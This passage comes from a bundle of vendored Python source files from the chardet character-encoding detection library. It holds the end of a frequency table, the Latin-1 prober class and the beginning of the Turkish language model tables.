954,7733,1668,7734,7735,3986,2404,  # 6150\n4189,3567,3809,4190,7736,2302,1318,2505,3091, 133,3092,2873,4473, 629,  31,2838,  # 6166\n2697,3810,4474, 850, 949,4475,3987,2955,1732,2088,4191,1496,1852,7737,3988, 620,  # 6182\n3214, 981,1242,3679,3360,1619,3680,1643,3293,2139,2452,1970,1719,3463,2168,7738,  # 6198\n3215,7739,7740,3361,1828,7741,1277,4476,1565,2047,7742,1636,3568,3093,7743, 869,  # 6214\n2839, 655,3811,3812,3094,3989,3000,3813,1310,3569,4477,7744,7745,7746,1733, 558,  # 6230\n4478,3681, 335,1549,3045,1756,4192,3682,1945,3464,1829,1291,1192, 470,2726,2107,  # 6246\n2793, 913,1054,3990,7747,1027,7748,3046,3991,4479, 982,2662,3362,3148,3465,3216,  # 6262\n3217,1946,2794,7749, 571,4480,7750,1830,7751,3570,2583,1523,2424,7752,2089, 984,  # 6278\n4481,3683,1959,7753,3684, 852, 923,2795,3466,3685, 969,1519, 999,2048,2320,1705,  # 6294\n7754,3095, 615,1662, 151, 597,3992,2405,2321,1049, 275,4482,3686,4193, 568,3687,  # 6310\n3571,2480,4194,3688,7755,2425,2270, 409,3218,7756,1566,2874,3467,1002, 769,2840,  # 6326\n 194,2090,3149,3689,2222,3294,4195, 628,1505,7757,7758,1763,2177,3001,3993, 521,  # 6342\n1161,2584,1787,2203,2406,4483,3994,1625,4196,4197, 412,  42,3096, 464,7759,2632,  # 6358\n4484,3363,1760,1571,2875,3468,2530,1219,2204,3814,2633,2140,2368,4485,4486,3295,  # 6374\n1651,3364,3572,7760,7761,3573,2481,3469,7762,3690,7763,7764,2271,2091, 460,7765,  # 6390\n4487,7766,3002, 962, 588,3574, 289,3219,2634,1116,  52,7767,3047,1796,7768,7769,  # 6406\n7770,1467,7771,1598,1143,3691,4198,1984,1734,1067,4488,1280,3365, 465,4489,1572,  # 6422\n 510,7772,1927,2241,1812,1644,3575,7773,4490,3692,7774,7775,2663,1573,1534,7776,  # 6438\n7777,4199, 536,1807,1761,3470,3815,3150,2635,7778,7779,7780,4491,3471,2915,1911,  # 6454\n2796,7781,3296,1122, 377,3220,7782, 360,7783,7784,4200,1529, 551,7785,2059,3693,  # 6470\n1769,2426,7786,2916,4201,3297,3097,2322,2108,2030,4492,1404, 136,1468,1479, 672,  # 6486\n1171,3221,2303, 271,3151,7787,2762,7788,2049, 678,2727, 865,1947,4493,7789,2013,  # 6502\n3995,2956,7790,2728,2223,1397,3048,3694,4494,4495,1735,2917,3366,3576,7791,3816,  # 6518\n 509,2841,2453,2876,3817,7792,7793,3152,3153,4496,4202,2531,4497,2304,1166,1010,  # 6534\n 552, 681,1887,7794,7795,2957,2958,3996,1287,1596,1861,3154, 358, 453, 736, 175,  # 6550\n 478,1117, 905,1167,1097,7796,1853,1530,7797,1706,7798,2178,3472,2287,3695,3473,  # 6566\n3577,4203,2092,4204,7799,3367,1193,2482,4205,1458,2190,2205,1862,1888,1421,3298,  # 6582\n2918,3049,2179,3474, 595,2122,7800,3997,7801,7802,4206,1707,2636, 223,3696,1359,  # 6598\n 751,3098, 183,3475,7803,2797,3003, 419,2369, 633, 704,3818,2389, 241,7804,7805,  # 6614\n7806, 838,3004,3697,2272,2763,2454,3819,1938,2050,3998,1309,3099,2242,1181,7807,  # 6630\n1136,2206,3820,2370,1446,4207,2305,4498,7808,7809,4208,1055,2605, 484,3698,7810,  # 6646\n3999, 625,4209,2273,3368,1499,4210,4000,7811,4001,4211,3222,2274,2275,3476,7812,  # 6662\n7813,2764, 808,2606,3699,3369,4002,4212,3100,2532, 526,3370,3821,4213, 955,7814,  # 6678\n1620,4214,2637,2427,7815,1429,3700,1669,1831, 994, 928,7816,3578,1260,7817,7818,  # 6694\n7819,1948,2288, 741,2919,1626,4215,2729,2455, 867,1184, 362,3371,1392,7820,7821,  # 6710\n4003,4216,1770,1736,3223,2920,4499,4500,1928,2698,1459,1158,7822,3050,3372,2877,  # 6726\n1292,1929,2506,2842,3701,1985,1187,2071,2014,2607,4217,7823,2566,2507,2169,3702,  # 6742\n2483,3299,7824,3703,4501,7825,7826, 666,1003,3005,1022,3579,4218,7827,4502,1813,  # 6758\n2253, 574,3822,1603, 295,1535, 705,3823,4219, 283, 858, 417,7828,7829,3224,4503,  # 6774\n4504,3051,1220,1889,1046,2276,2456,4004,1393,1599, 689,2567, 388,4220,7830,2484,  # 6790\n 802,7831,2798,3824,2060,1405,2254,7832,4505,3825,2109,1052,1345,3225,1585,7833,  # 6806\n 809,7834,7835,7836, 575,2730,3477, 956,1552,1469,1144,2323,7837,2324,1560,2457,  # 6822\n3580,3226,4005, 616,2207,3155,2180,2289,7838,1832,7839,3478,4506,7840,1319,3704,  # 6838\n3705,1211,3581,1023,3227,1293,2799,7841,7842,7843,3826, 607,2306,3827, 762,2878,  # 6854\n1439,4221,1360,7844,1485,3052,7845,4507,1038,4222,1450,2061,2638,4223,1379,4508,  # 6870\n2585,7846,7847,4224,1352,1414,2325,2921,1172,7848,7849,3828,3829,7850,1797,1451,  # 6886\n7851,7852,7853,7854,2922,4006,4007,2485,2346, 411,4008,4009,3582,3300,3101,4509,  # 6902\n1561,2664,1452,4010,1375,7855,7856,  47,2959, 316,7857,1406,1591,2923,3156,7858,  # 6918\n1025,2141,3102,3157, 354,2731, 884,2224,4225,2407, 508,3706, 726,3583, 996,2428,  # 6934\n3584, 729,7859, 392,2191,1453,4011,4510,3707,7860,7861,2458,3585,2608,1675,2800,  # 6950\n 919,2347,2960,2348,1270,4511,4012,  73,7862,7863, 647,7864,3228,2843,2255,1550,  # 6966\n1346,3006,7865,1332, 883,3479,7866,7867,7868,7869,3301,2765,7870,1212, 831,1347,  # 6982\n4226,4512,2326,3830,1863,3053, 720,3831,4513,4514,3832,7871,4227,7872,7873,4515,  # 6998\n7874,7875,1798,4516,3708,2609,4517,3586,1645,2371,7876,7877,2924, 669,2208,2665,  # 7014\n2429,7878,2879,7879,7880,1028,3229,7881,4228,2408,7882,2256,1353,7883,7884,4518,  # 7030\n3158, 518,7885,4013,7886,4229,1960,7887,2142,4230,7888,7889,3007,2349,2350,3833,  # 7046\n 516,1833,1454,4014,2699,4231,4519,2225,2610,1971,1129,3587,7890,2766,7891,2961,  # 7062\n1422, 577,1470,3008,1524,3373,7892,7893, 432,4232,3054,3480,7894,2586,1455,2508,  # 7078\n2226,1972,1175,7895,1020,2732,4015,3481,4520,7896,2733,7897,1743,1361,3055,3482,  # 7094\n2639,4016,4233,4521,2290, 895, 924,4234,2170, 331,2243,3056, 166,1627,3057,1098,  # 7110\n7898,1232,2880,2227,3374,4522, 657, 403,1196,2372, 542,3709,3375,1600,4235,3483,  # 7126\n7899,4523,2767,3230, 576, 530,1362,7900,4524,2533,2666,3710,4017,7901, 842,3834,  # 7142\n7902,2801,2031,1014,4018, 213,2700,3376, 665, 621,4236,7903,3711,2925,2430,7904,  # 7158\n2431,3302,3588,3377,7905,4237,2534,4238,4525,3589,1682,4239,3484,1380,7906, 724,  # 7174\n2277, 600,1670,7907,1337,1233,4526,3103,2244,7908,1621,4527,7909, 651,4240,7910,  # 7190\n1612,4241,2611,7911,2844,7912,2734,2307,3058,7913, 716,2459,3059, 174,1255,2701,  # 7206\n4019,3590, 548,1320,1398, 728,4020,1574,7914,1890,1197,3060,4021,7915,3061,3062,  # 7222\n3712,3591,3713, 747,7916, 635,4242,4528,7917,7918,7919,4243,7920,7921,4529,7922,  # 7238\n3378,4530,2432, 451,7923,3714,2535,2072,4244,2735,4245,4022,7924,1764,4531,7925,  # 7254\n4246, 350,7926,2278,2390,2486,7927,4247,4023,2245,1434,4024, 488,4532, 458,4248,  # 7270\n4025,3715, 771,1330,2391,3835,2568,3159,2159,2409,1553,2667,3160,4249,7928,2487,  # 7286\n2881,2612,1720,2702,4250,3379,4533,7929,2536,4251,7930,3231,4252,2768,7931,2015,  # 7302\n2736,7932,1155,1017,3716,3836,7933,3303,2308, 201,1864,4253,1430,7934,4026,7935,  # 7318\n7936,7937,7938,7939,4254,1604,7940, 414,1865, 371,2587,4534,4535,3485,2016,3104,  # 7334\n4536,1708, 960,4255, 887, 389,2171,1536,1663,1721,7941,2228,4027,2351,2926,1580,  # 7350\n7942,7943,7944,1744,7945,2537,4537,4538,7946,4539,7947,2073,7948,7949,3592,3380,  # 7366\n2882,4256,7950,4257,2640,3381,2802, 673,2703,2460, 709,3486,4028,3593,4258,7951,  # 7382\n1148, 502, 634,7952,7953,1204,4540,3594,1575,4541,2613,3717,7954,3718,3105, 948,  # 7398\n3232, 121,1745,3837,1110,7955,4259,3063,2509,3009,4029,3719,1151,1771,3838,1488,  # 7414\n4030,1986,7956,2433,3487,7957,7958,2093,7959,4260,3839,1213,1407,2803, 531,2737,  # 7430\n2538,3233,1011,1537,7960,2769,4261,3106,1061,7961,3720,3721,1866,2883,7962,2017,  # 7446\n 120,4262,4263,2062,3595,3234,2309,3840,2668,3382,1954,4542,7963,7964,3488,1047,  # 7462\n2704,1266,7965,1368,4543,2845, 649,3383,3841,2539,2738,1102,2846,2669,7966,7967,  # 7478\n1999,7968,1111,3596,2962,7969,2488,3842,3597,2804,1854,3384,3722,7970,7971,3385,  # 7494\n2410,2884,3304,3235,3598,7972,2569,7973,3599,2805,4031,1460, 856,7974,3600,7975,  # 7510\n2885,2963,7976,2886,3843,7977,4264, 632,2510, 875,3844,1697,3845,2291,7978,7979,  # 7526\n4544,3010,1239, 580,4545,4265,7980, 914, 936,2074,1190,4032,1039,2123,7981,7982,  # 7542\n7983,3386,1473,7984,1354,4266,3846,7985,2172,3064,4033, 915,3305,4267,4268,3306,  # 7558\n1605,1834,7986,2739, 398,3601,4269,3847,4034, 328,1912,2847,4035,3848,1331,4270,  # 7574\n3011, 937,4271,7987,3602,4036,4037,3387,2160,4546,3388, 524, 742, 538,3065,1012,  # 7590\n7988,7989,3849,2461,7990, 658,1103, 225,3850,7991,7992,4547,7993,4548,7994,3236,  # 7606\n1243,7995,4038, 963,2246,4549,7996,2705,3603,3161,7997,7998,2588,2327,7999,4550,  # 7622\n8000,8001,8002,3489,3307, 957,3389,2540,2032,1930,2927,2462, 870,2018,3604,1746,  # 7638\n2770,2771,2434,2463,8003,3851,8004,3723,3107,3724,3490,3390,3725,8005,1179,3066,  # 7654\n8006,3162,2373,4272,3726,2541,3163,3108,2740,4039,8007,3391,1556,2542,2292, 977,  # 7670\n2887,2033,4040,1205,3392,8008,1765,3393,3164,2124,1271,1689, 714,4551,3491,8009,  # 7686\n2328,3852, 533,4273,3605,2181, 617,8010,2464,3308,3492,2310,8011,8012,3165,8013,  # 7702\n8014,3853,1987, 618, 427,2641,3493,3394,8015,8016,1244,1690,8017,2806,4274,4552,  # 7718\n8018,3494,8019,8020,2279,1576, 473,3606,4275,3395, 972,8021,3607,8022,3067,8023,  # 7734\n8024,4553,4554,8025,3727,4041,4042,8026, 153,4555, 356,8027,1891,2888,4276,2143,  # 7750\n 408, 803,2352,8028,3854,8029,4277,1646,2570,2511,4556,4557,3855,8030,3856,4278,  # 7766\n8031,2411,3396, 752,8032,8033,1961,2964,8034, 746,3012,2465,8035,4279,3728, 698,  # 7782\n4558,1892,4280,3608,2543,4559,3609,3857,8036,3166,3397,8037,1823,1302,4043,2706,  # 7798\n3858,1973,4281,8038,4282,3167, 823,1303,1288,1236,2848,3495,4044,3398, 774,3859,  # 7814\n8039,1581,4560,1304,2849,3860,4561,8040,2435,2161,1083,3237,4283,4045,4284, 344,  # 7830\n1173, 288,2311, 454,1683,8041,8042,1461,4562,4046,2589,8043,8044,4563, 985, 894,  # 7846\n8045,3399,3168,8046,1913,2928,3729,1988,8047,2110,1974,8048,4047,8049,2571,1194,  # 7862\n 425,8050,4564,3169,1245,3730,4285,8051,8052,2850,8053, 636,4565,1855,3861, 760,  # 7878\n1799,8054,4286,2209,1508,4566,4048,1893,1684,2293,8055,8056,8057,4287,4288,2210,  # 7894\n 479,8058,8059, 832,8060,4049,2489,8061,2965,2490,3731, 990,3109, 627,1814,2642,  # 7910\n4289,1582,4290,2125,2111,3496,4567,8062, 799,4291,3170,8063,4568,2112,1737,3013,  # 7926\n1018, 543, 754,4292,3309,1676,4569,4570,4050,8064,1489,8065,3497,8066,2614,2889,  # 7942\n4051,8067,8068,2966,8069,8070,8071,8072,3171,4571,4572,2182,1722,8073,3238,3239,  # 7958\n1842,3610,1715, 481, 365,1975,1856,8074,8075,1962,2491,4573,8076,2126,3611,3240,  # 7974\n 433,1894,2063,2075,8077, 602,2741,8078,8079,8080,8081,8082,3014,1628,3400,8083,  # 7990\n3172,4574,4052,2890,4575,2512,8084,2544,2772,8085,8086,8087,3310,4576,2891,8088,  # 8006\n4577,8089,2851,4578,4579,1221,2967,4053,2513,8090,8091,8092,1867,1989,8093,8094,  # 8022\n8095,1895,8096,8097,4580,1896,4054, 318,8098,2094,4055,4293,8099,8100, 485,8101,  # 8038\n 938,3862, 553,2670, 116,8102,3863,3612,8103,3498,2671,2773,3401,3311,2807,8104,  # 8054\n3613,2929,4056,1747,2930,2968,8105,8106, 207,8107,8108,2672,4581,2514,8109,3015,  # 8070\n 890,3614,3864,8110,1877,3732,3402,8111,2183,2353,3403,1652,8112,8113,8114, 941,  # 8086\n2294, 208,3499,4057,2019, 330,4294,3865,2892,2492,3733,4295,8115,8116,8117,8118,  # 8102\n)\n\n", "thirdparty/chardet/latin1prober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetprober import CharSetProber\nfrom .enums import ProbingState\n\nFREQ_CAT_NUM = 4\n\nUDF = 0  # undefined\nOTH = 1  # other\nASC = 2  # ascii capital letter\nASS = 3  # ascii small letter\nACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\n\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 20 - 27\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 28 - 2F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 30 - 37\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 38 - 3F\n    OTH, ASC, ASC, ASC, ASC, ASC, ASC, ASC,   # 40 - 47\n    ASC, ASC, ASC, ASC, ASC, ASC, ASC, ASC,   # 48 - 4F\n    ASC, ASC, ASC, ASC, ASC, ASC, ASC, ASC,   # 50 - 57\n    ASC, ASC, ASC, OTH, OTH, OTH, OTH, OTH,   # 58 - 5F\n    OTH, ASS, ASS, ASS, ASS, ASS, ASS, ASS,   # 60 - 67\n    ASS, ASS, ASS, ASS, ASS, ASS, ASS, ASS,   # 68 - 6F\n    ASS, ASS, ASS, ASS, ASS, ASS, ASS, ASS,   # 70 - 77\n    ASS, ASS, ASS, OTH, OTH, OTH, OTH, OTH,   # 78 - 7F\n    OTH, UDF, OTH, ASO, OTH, OTH, OTH, OTH,   # 80 - 87\n    OTH, OTH, ACO, OTH, ACO, UDF, ACO, UDF,   # 88 - 8F\n    UDF, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 90 - 97\n    OTH, OTH, ASO, OTH, ASO, UDF, ASO, ACO,   # 98 - 9F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # A0 - A7\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # A8 - AF\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # B0 - B7\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # B8 - BF\n    ACV, ACV, ACV, ACV, ACV, ACV, ACO, ACO,   # C0 - C7\n    ACV, ACV, ACV, ACV, ACV, ACV, ACV, ACV,   # C8 - CF\n    ACO, ACO, ACV, ACV, ACV, ACV, ACV, OTH,   # D0 - D7\n    ACV, ACV, ACV, ACV, ACV, ACO, ACO, ACO,   # D8 - DF\n    ASV, ASV, ASV, ASV, ASV, ASV, ASO, ASO,   # E0 - E7\n    ASV, ASV, ASV, ASV, ASV, ASV, ASV, ASV,   # E8 - EF\n    ASO, ASO, ASV, ASV, ASV, ASV, ASV, OTH,   # F0 - F7\n    ASV, ASV, ASV, ASV, ASV, ASO, ASO, ASO,   # F8 - FF\n)\n\n# 0 : illegal\n# 1 : very unlikely\n# 2 : normal\n# 3 : very likely\nLatin1ClassModel = (\n# UDF OTH ASC ASS ACV ACO ASV ASO\n    0,  0,  0,  0,  0,  0,  0,  0,  # UDF\n    0,  3,  3,  3,  3,  3,  3,  3,  # OTH\n    0,  3,  3,  3,  3,  3,  3,  3,  # ASC\n    0,  3,  3,  3,  1,  1,  3,  3,  # ASS\n    0,  3,  3,  3,  1,  2,  1,  2,  # ACV\n    0,  3,  3,  3,  3,  3,  3,  3,  # ACO\n    0,  3,  1,  3,  1,  1,  1,  3,  # ASV\n    0,  3,  1,  3,  1,  1,  3,  3,  # ASO\n)\n\n\nclass Latin1Prober(CharSetProber):\n    def __init__(self):\n        super(Latin1Prober, self).__init__()\n        self._last_char_class = None\n        self._freq_counter = None\n        self.reset()\n\n    def reset(self):\n        self._last_char_class = OTH\n        self._freq_counter = [0] * FREQ_CAT_NUM\n        CharSetProber.reset(self)\n\n    @property\n    def charset_name(self):\n        return \"ISO-8859-1\"\n\n    @property\n    def language(self):\n        return \"\"\n\n    def feed(self, byte_str):\n        byte_str = self.filter_with_english_letters(byte_str)\n        for c in byte_str:\n            char_class = Latin1_CharToClass[c]\n            freq = Latin1ClassModel[(self._last_char_class * CLASS_NUM)\n                                    + char_class]\n            if freq == 0:\n                self._state = ProbingState.NOT_ME\n                break\n            self._freq_counter[freq] += 1\n            self._last_char_class = char_class\n\n        return self.state\n\n    def get_confidence(self):\n        if self.state == ProbingState.NOT_ME:\n            return 0.01\n\n        total = sum(self._freq_counter)\n        if total < 0.01:\n            confidence = 0.0\n        else:\n            confidence = ((self._freq_counter[3] - self._freq_counter[1] * 20.0)\n                          / total)\n        if confidence < 0.0:\n            confidence = 0.0\n        # lower the confidence of latin1 so that other more accurate\n        # detector can take priority.\n        confidence = confidence * 0.73\n        return confidence\n", "thirdparty/chardet/langturkishmodel.py": "# -*- coding: utf-8 -*-\n######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   \u00d6zg\u00fcr Bask\u0131n - Turkish Language Model\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# 255: Control characters that usually does not exist in any text\n# 254: Carriage/Return\n# 253: symbol (punctuation) that does not belong to word\n# 252: 0 - 9\n\n# Character Mapping Table:\nLatin5_TurkishCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255, 23, 37, 47, 39, 29, 52, 36, 45, 53, 60, 16, 49, 20, 46, 42,\n 48, 69, 44, 35, 31, 51, 38, 62, 65, 43, 56,255,255,255,255,255,\n255,  1, 21, 28, 12,  2, 18, 27, 25,  3, 24, 10,  5, 13,  4, 15,\n 26, 64,  7,  8,  9, 14, 32, 57, 58, 11, 22,255,255,255,255,255,\n180,179,178,177,176,175,174,173,172,171,170,169,168,167,166,165,\n164,163,162,161,160,159,101,158,157,156,155,154,153,152,151,106,\n150,149,148,147,146,145,144,100,143,142,141,140,139,138,137,136,\n 94, 80, 93,135,105,134,133, 63,132,131,130,129,128,127,126,125,\n124,104, 73, 99, 79, 85,123, 54,122, 98, 92,121,120, 91,103,119,\n 68,118,117, 97,116,115, 50, 90,114,113,112,111, 55, 41, 40, 86,\n 89, 70, 59, 78, 71, 82, 88, 33, 77, 66, 84, 83,110, 75, 61, 96,\n 30, 67,109, 74, 87,102, 34, 95, 81,108, 76, 72, 17,  6, 19,107,\n)\n\nTurkishLangModel = (\n3,2,3,3,3,1,3,3,3,3,3,3,3,3,2,1,1,3,3,1,3,3,0,3,3,3,3,3,0,3,1,3,\n3,2,1,0,0,1,1,0,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,2,2,0,0,1,0,0,1,\n3,2,2,3,3,0,3,3,3,3,3,3,3,2,3,1,0,3,3,1,3,3,0,3,3,3,3,3,0,3,0,3,\n3,1,1,0,1,0,1,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,2,2,0,0,0,1,0,1,\n3,3,2,3,3,0,3,3,3,3,3,3,3,2,3,1,1,3,3,0,3,3,1,2,3,3,3,3,0,3,0,3,\n3,1,1,0,0,0,1,0,0,0,0,1,1,0,1,2,1,0,0,0,1,0,0,0,0,2,0,0,0,0,0,1,\n3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,1,3,3,2,0,3,2,1,2,2,1,3,3,0,0,0,2,\n2,2,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,0,1,\n3,3,3,2,3,3,1,2,3,3,3,3,3,3,3,1,3,2,1,0,3,2,0,1,2,3,3,2,1,0,0,2,\n2,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,2,0,0,0,\n1,0,1,3,3,1,3,3,3,3,3,3,3,1,2,0,0,2,3,0,2,3,0,0,2,2,2,3,0,3,0,1,\n2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,0,3,2,0,2,3,2,3,3,1,0,0,2,\n3,2,0,0,1,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,1,1,1,0,2,0,0,1,\n3,3,3,2,3,3,2,3,3,3,3,2,3,3,3,0,3,3,0,0,2,1,0,0,2,3,2,2,0,0,0,2,\n2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,0,1,0,2,0,0,1,\n3,3,3,2,3,3,3,3,3,3,3,2,3,3,3,0,3,2,0,1,3,2,1,1,3,2,3,2,1,0,0,2,\n2,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,\n3,3,3,2,3,3,3,3,3,3,3,2,3,3,3,0,3,2,2,0,2,3,0,0,2,2,2,2,0,0,0,2,\n3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,0,0,\n3,3,3,3,3,3,3,2,2,2,2,3,2,3,3,0,3,3,1,1,2,2,0,0,2,2,3,2,0,0,1,3,\n0,3,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,1,\n3,3,3,2,3,3,3,2,1,2,2,3,2,3,3,0,3,2,0,0,1,1,0,1,1,2,1,2,0,0,0,1,\n0,3,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,0,0,\n3,3,3,2,3,3,2,3,2,2,2,3,3,3,3,1,3,1,1,0,3,2,1,1,3,3,2,3,1,0,0,1,\n1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,0,1,\n3,2,2,3,3,0,3,3,3,3,3,3,3,2,2,1,0,3,3,1,3,3,0,1,3,3,2,3,0,3,0,3,\n2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,\n2,2,2,3,3,0,3,3,3,3,3,3,3,3,3,0,0,3,2,0,3,3,0,3,2,3,3,3,0,3,1,3,\n2,0,0,0,0,0,0,0,0,0,0,1,0,1,2,0,1,0,0,0,0,0,0,0,2,2,0,0,1,0,0,1,\n3,3,3,1,2,3,3,1,0,0,1,0,0,3,3,2,3,0,0,2,0,0,2,0,2,0,0,0,2,0,2,0,\n0,3,1,0,1,0,0,0,2,2,1,0,1,1,2,1,2,2,2,0,2,1,1,0,0,0,2,0,0,0,0,0,\n1,2,1,3,3,0,3,3,3,3,3,2,3,0,0,0,0,2,3,0,2,3,1,0,2,3,1,3,0,3,0,2,\n3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,1,3,3,2,2,3,2,2,0,1,2,3,0,1,2,1,0,1,0,0,0,1,0,2,2,0,0,0,1,\n1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,\n3,3,3,1,3,3,1,1,3,3,1,1,3,3,1,0,2,1,2,0,2,1,0,0,1,1,2,1,0,0,0,2,\n2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,1,0,2,1,3,0,0,2,0,0,3,3,0,3,0,0,1,0,1,2,0,0,1,1,2,2,0,1,0,\n0,1,2,1,1,0,1,0,1,1,1,1,1,0,1,1,1,2,2,1,2,0,1,0,0,0,0,0,0,1,0,0,\n3,3,3,2,3,2,3,3,0,2,2,2,3,3,3,0,3,0,0,0,2,2,0,1,2,1,1,1,0,0,0,1,\n0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,\n3,3,3,3,3,3,2,1,2,2,3,3,3,3,2,0,2,0,0,0,2,2,0,0,2,1,3,3,0,0,1,1,\n1,1,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,\n1,1,2,3,3,0,3,3,3,3,3,3,2,2,0,2,0,2,3,2,3,2,2,2,2,2,2,2,1,3,2,3,\n2,0,2,1,2,2,2,2,1,1,2,2,1,2,2,1,2,0,0,2,1,1,0,2,1,0,0,1,0,0,0,1,\n2,3,3,1,1,1,0,1,1,1,2,3,2,1,1,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,\n0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,2,2,2,3,2,3,2,2,1,3,3,3,0,2,1,2,0,2,1,0,0,1,1,1,1,1,0,0,1,\n2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,2,0,1,0,0,0,\n3,3,3,2,3,3,3,3,3,2,3,1,2,3,3,1,2,0,0,0,0,0,0,0,3,2,1,1,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,\n3,3,3,2,2,3,3,2,1,1,1,1,1,3,3,0,3,1,0,0,1,1,0,0,3,1,2,1,0,0,0,0,\n0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,\n3,3,3,2,2,3,2,2,2,3,2,1,1,3,3,0,3,0,0,0,0,1,0,0,3,1,1,2,0,0,0,1,\n1,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n1,1,1,3,3,0,3,3,3,3,3,2,2,2,1,2,0,2,1,2,2,1,1,0,1,2,2,2,2,2,2,2,\n0,0,2,1,2,1,2,1,0,1,1,3,1,2,1,1,2,0,0,2,0,1,0,1,0,1,0,0,0,1,0,1,\n3,3,3,1,3,3,3,0,1,1,0,2,2,3,1,0,3,0,0,0,1,0,0,0,1,0,0,1,0,1,0,0,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,